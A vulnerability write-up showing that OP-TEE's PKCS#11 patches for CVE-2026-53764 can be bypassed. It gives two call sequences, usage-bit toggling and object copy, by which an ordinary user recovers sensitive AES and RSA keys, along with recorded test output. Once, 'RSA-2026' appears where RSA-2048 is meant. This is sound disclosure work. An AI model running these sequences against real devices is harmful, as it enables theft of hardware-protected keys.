---
layout: post
title: "OP-TEE PKCS#11: the CVE-2026-53764 fix that only validates one instant"
subtitle: "two patches check the key's current usage bits and nothing else, so an ordinary CKU_USER recovers a sensitive AES key and a full RSA-2048 private key through usage toggling or object copy, both routes measured on the complete fix"
date: 2026-10-01
tags: [pkcs11, op-tee, incomplete-fix, trusted-wrap, bug-bounty]
category: research
tldr: "The two patches merged for CVE-2026-53764 inspect an object's instantaneous usage bits. Neither consults what a key was used for earlier, and the usage bits are user-modifiable, so the same extraction the advisory describes still works: wrap-only now, decrypt-only later, or copy the wrap-only key into a decrypt-only sibling. Measured on current OP-TEE main, an ordinary user recovers an SO-provisioned sensitive AES key and a complete RSA-2048 private key marked CKA_WRAP_WITH_TRUSTED. Reported through Intigriti against the TrustedFirmware program; closed as duplicate of an internal finding. Public follow-up patch is not out at the time of writing; the advisory lists the fix as landing in 4.11.0 (unreleased)."
---

## tldr

CVE-2026-53764 was the single-key dual-use bug: an AES key with both `CKA_WRAP` and `CKA_DECRYPT` set at once wrapped a sensitive key and immediately decrypted the result. OP-TEE merged two patches for it. The first (`058ad15f8`) rejects a creation template that sets WRAP or UNWRAP together with ENCRYPT or DECRYPT. The second (`a33d6483e`) refuses a key with ENCRYPT or DECRYPT set only when the current call is `PKCS11_FUNCTION_WRAP` or `PKCS11_FUNCTION_UNWRAP`.

Both patches look at one object, in one instantaneous state, in isolation. Neither consults what the key was used for earlier. And `attribute_is_modifiable()` at `pkcs11_attributes.c:2335` lets an ordinary user flip `CKA_DECRYPT` and `CKA_WRAP` on a secret key. Two routes defeat the pair of checks with every intermediate state statically consistent:

- Route 1 (temporal). Set the key wrap-only, wrap the target, set it decrypt-only, decrypt the wrapped bytes.
- Route 2 (spatial). Copy the wrap-only key into a sibling with decrypt-only bits. Two objects, same key material, complementary roles.

Both routes recovered an SO-provisioned sensitive AES key and a complete RSA-2026 private key marked `CKA_WRAP_WITH_TRUSTED` on a build carrying both published patches. Negative controls prove the user cannot set `CKA_TRUSTED` and cannot read either key directly, so the wrap route is doing the work.

Reported through Intigriti against the TrustedFirmware program on 2026-09-23. Closed as **duplicate** of `ARM-PHPJYAN0` on the same day. The published advisory records the fix landing in release 4.11.0, which is unreleased at the time of writing. The follow-up commit is not yet in `optee_os` master, so the behaviour below is what the current public tree does.

## what each published patch actually checks

`058ad15f8`, `check_attrs_misc_integrity()` at `ta/pkcs11/src/pkcs11_attributes.c:1531-1537`. Rejects a template that sets WRAP or UNWRAP together with ENCRYPT or DECRYPT. Runs on the way in, inspects one object.

`a33d6483e`, `check_parent_attrs_against_processing()` at `pkcs11_attributes.c:2127-2135`. Refuses a key currently carrying ENCRYPT or DECRYPT under one explicit guard:

```c
if (function == PKCS11_FUNCTION_WRAP || function == PKCS11_FUNCTION_UNWRAP) {
    /* ...refuse ENCRYPT or DECRYPT set... */
}
```

A subsequent `C_Decrypt` arrives as `PKCS11_FUNCTION_DECRYPT`. That branch is not taken, and nothing in the function examines usage history.

Neither check is re-applied to the merged result of a modification or a copy. `attribute_is_modifiable()` at `pkcs11_attributes.c:2335` permits `PKCS11_CKA_DECRYPT` and `PKCS11_CKA_WRAP` on a secret key. Two entry points reach the same key material: `entry_set_attribute_value()` at `ta/pkcs11/src/object.c:1001` and `entry_copy_object()` at `object.c:1140`.

Enabling attributes are on by default. `pkcs11_object_default_boolprop()` at `pkcs11_attributes.c:163-166` returns true for `CKA_MODIFIABLE`, `CKA_COPYABLE`, `CKA_DESTROYABLE`, under the source comment "As per PKCS#11 default value". This is the default path, not a hardened-deployment mistake.

## the policy the two routes defeat

`CKA_WRAP_WITH_TRUSTED` is checked at `ta/pkcs11/src/processing.c:1250`, and only while wrapping. The whole point of the attribute is that the SO designates one trusted wrapping key and guarantees a sensitive key can only leave through it. Once the ciphertext exists, neither the trusted designation nor the target's policy constrains who decrypts it. The trusted key itself is modifiable and copyable by an ordinary user.

So the attack is on the trusted wrapping key, not on `CKA_TRUSTED` itself. The user cannot set `CKA_TRUSTED` and the control proves it. The SO provisioned a trusted wrapper, left modifiable and copyable by default, and the user picks it up, flips a bit, decrypts the result.

## route 1, the temporal toggle

```
# as CKU_USER, with the SO's trusted wrapping key handle in trusted_key:

C_SetAttributeValue(trusted_key, {CKA_ENCRYPT=false, CKA_DECRYPT=false,
                                  CKA_WRAP=true,     CKA_UNWRAP=false})
C_WrapKey(mech=CKM_AES_CBC_PAD, wrap_key=trusted_key, key=target_sensitive_aes,
          out=wrapped_blob)

C_SetAttributeValue(trusted_key, {CKA_WRAP=false,    CKA_UNWRAP=false,
                                  CKA_ENCRYPT=false, CKA_DECRYPT=true})
C_Decrypt(mech=CKM_AES_CBC_PAD, key=trusted_key, in=wrapped_blob,
          out=recovered_aes_bytes)
```

At every instant the object holds one role. The creation-time check sees nothing to reject. The wrap-time check sees a wrap-only key when wrapping and a decrypt-only key when decrypting; its guard is bound to the current function, so a `C_Decrypt` call does not take the branch that would complain about the DECRYPT bit.

## route 2, the object copy

```
C_SetAttributeValue(trusted_key, {CKA_ENCRYPT=false, CKA_DECRYPT=false,
                                  CKA_WRAP=true,     CKA_UNWRAP=false})
C_CopyObject(trusted_key,
             template={CKA_WRAP=false,    CKA_UNWRAP=false,
                       CKA_ENCRYPT=false, CKA_DECRYPT=true,
                       CKA_LABEL="shadow"}, out=shadow_key)

C_WrapKey (wrap_key=trusted_key, key=target, out=wrapped_blob)
C_Decrypt (key=shadow_key,       in=wrapped_blob, out=recovered)
```

No temporal element at all. Two statically consistent objects now share the same AES key bytes with complementary roles. A fix that only revoked active operations when usage changed on an object would leave this route intact.

## runtime evidence: both routes, both key types, on the complete fix

Measured on `5858c37a66cbffccf7b047d0f9a52dee0ebbf06c`, which carries both published patches. The same code is present at current `main`. Reproduced under QEMU on `vexpress-qemu_armv8a`, with `tee-supplicant` running and `/dev/tee0` widened to standard distro-udev permissions. Setup and attack run as two separate processes at the same unprivileged uid 1000.

Recorded output, `poc/runs/run17-prod-pair/console.log`:

```text
LAB_COMMIT=5858c37a66cbffccf7b047d0f9a52dee0ebbf06c
NEG target C_GetAttributeValue rv=0x00000011 expected=0x00000011 PASS
NEG static decrypt+wrap create rv=0x000000d1 expected=0x000000d1 PASS
NEG USER cannot set CKA_TRUSTED rv=0x00000010 expected=0x00000010 PASS
NEG trusted wrong key not target PASS
TRUSTED_TOGGLE_RECOVERY=1
TRUSTED_COPY_RECOVERY=1
RSA_TOGGLE_PRIVATE_RECOVERY=1
RSA_COPY_PRIVATE_RECOVERY=1
LIFECYCLE_CONTROL_FAILURES=0
LIFECYCLE_VERDICT=CONFIRMED_CROSS_PROCESS_BYPASS
PKCS11_TEMPORAL_CLIENT_EXIT=0
```

`NEG static decrypt+wrap create` returning `0xd1` (`CKR_TEMPLATE_INCONSISTENT`) is the discriminator: it proves the published fix is active in this binary. The four recovery markers are 1. The RSA markers include DER parse of the recovered modulus compared against `CKA_MODULUS` of the public object, so a decrypt that merely returned success without yielding the private key would fail.

Second boot, fresh random targets, same verdict. The harness binary SHA-256 was identical across all four runs (`16ab723eaa719988c766ce81ed25169fd3d97c35cecca743f77b0281eaf41e7d`); only the Trusted Application changed between builds.

## negative controls, each ruling out one false reading

| Control | Rules out |
|---|---|
| `NEG static decrypt+wrap create` returns `0xd1` on main | that the tested binary lacks the fix, which would make the result trivial |
| `NEG USER cannot set CKA_TRUSTED` returns `0x10` | that the ordinary user simply granted itself the trusted role |
| `NEG target C_GetAttributeValue` returns `0x11` | that the key was readable directly, making the wrap route unnecessary |
| wrong-key arms on every route | that the recovered bytes are an artefact rather than the target |
| two clean boots per build, fresh random targets | that one run was a fluke |
| recovered RSA modulus compared against `CKA_MODULUS` of the public object | that a decrypt merely returned success without the real private key |

## reading one line that matters: the "FAIL" on release 4.10.0

The same harness run against release 4.10.0, which predates both patches:

```text
LAB_COMMIT=753afbbee1682f5d16fd30e87b31058a4fd4f4b8
NEG static decrypt+wrap create rv=0x00000000 expected=0x000000d1 FAIL
TRUSTED_TOGGLE_RECOVERY=1
TRUSTED_COPY_RECOVERY=1
RSA_TOGGLE_PRIVATE_RECOVERY=1
RSA_COPY_PRIVATE_RECOVERY=1
LIFECYCLE_CONTROL_FAILURES=1
LIFECYCLE_VERDICT=NOT_CONFIRMED
```

Read that FAIL carefully. It is the discriminator and not a failure of the attack. The harness expects `0xd1` because it was written against `main`. Release 4.10.0 does not carry the separation patches, so creating a dual-use key simply succeeds and returns `0x0`. The harness is strict and refuses to print CONFIRMED when any control deviates, which is why the verdict reads NOT_CONFIRMED while all four recovery markers are 1.

That one line does two jobs. It proves in-band which binary ran, without trusting a label, because only a tree carrying `058ad15f8` refuses that creation. And it shows the release is vulnerable by an even shorter route, with no attribute change needed at all.

## scoring

`CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` = 8.4 High. `AV:L` because the attacker is a local Normal World process. `AC:L` because the sequence is deterministic, no race, no timing. `PR:L` because an ordinary authenticated user session is required and nothing more. `S:C` because a Normal World process obtains Secure World key material, crossing the TEE boundary. `C:H` and `I:H` from full private key disclosure and the forgery it enables. `A:N`.

Honest limitation: the chain needs the SO's trusted wrapping key to have been left modifiable or copyable. Those are the PKCS#11 defaults, as the source shows, and setting both false blocks both routes.

CWE-284 Improper Access Control (incomplete fix of the parent advisory).

## suggested fix

Re-apply `check_attrs_misc_integrity()` to the merged attribute set after a modification and after a copy, not only to the incoming template, so a usage change that produces a dual-role history is refused at the point it is requested. Alternatively bind the constraint to the key material rather than to the object, so a copy inherits the role its source already exercised. A fix that only revokes active operations leaves route 2 intact.

## report status and public fix

Reported through Intigriti against the TrustedFirmware program on 2026-09-23. Closed on the same day as **duplicate** of `ARM-PHPJYAN0`, with the triage severity preserved at High. The published CVE-2026-53764 advisory records the fix landing in release 4.11.0, which is **unreleased** at the time of writing, and the follow-up commit is not yet in `optee_os` master. The two patches on `main` are still `058ad15f8` and `a33d6483e`, which this report shows are incomplete.

That advisory's own timeline includes "2026-09-03: Removed the third patch and updated public disclosure date." The content of the removed patch is not public, so I cannot say whether it covered the modification and copy routes. The duplicate close suggests TrustedFirmware already has the finding on file; the public tree still carries the behaviour above.

Posting the write-up now, with the status honestly reported, because the mechanics are worth understanding ahead of 4.11.0 and the discipline point generalises past PKCS#11: a check that validates one instantaneous object state is defeated by changing the state between operations or by producing a second object with the state the attacker wants. Instantaneous checks need to bind to history or to material, not to the object a caller currently holds.

## references

- [OP-TEE `optee_os` on GitHub](https://github.com/OP-TEE/optee_os)
- [patch `058ad15f8` separate data and key encryption keys](https://github.com/OP-TEE/optee_os/commit/058ad15f8)
- [patch `a33d6483e` enforce separation at wrap time](https://github.com/OP-TEE/optee_os/commit/a33d6483e)
- [CVE-2026-53764 / GHSA-9wp2-68g9-8rpv](https://github.com/OP-TEE/optee_os/security/advisories/GHSA-9wp2-68g9-8rpv)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
